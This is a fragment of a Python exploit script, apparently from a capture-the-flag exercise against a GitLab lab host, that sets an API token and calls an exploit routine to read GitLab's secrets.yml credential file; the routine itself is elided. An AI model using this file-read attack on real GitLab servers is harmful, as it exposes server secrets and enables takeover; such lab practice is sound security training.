...
session.verify = False  # or set session.verify = False

host = 'https://git.laboratory.htb'
token = 'JrsEgcV4dMPx8qWo2dCr'
...
if __name__ == "__main__":
    ...
    write_files = ['/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml']
    with open('sensitive_files', 'w') as sens:
        for file in write_files:
            sens.write(file)

    files = list(open('sensitive_files', 'r'))
    exploit('secrets.yml', 'issue-1', files, token)
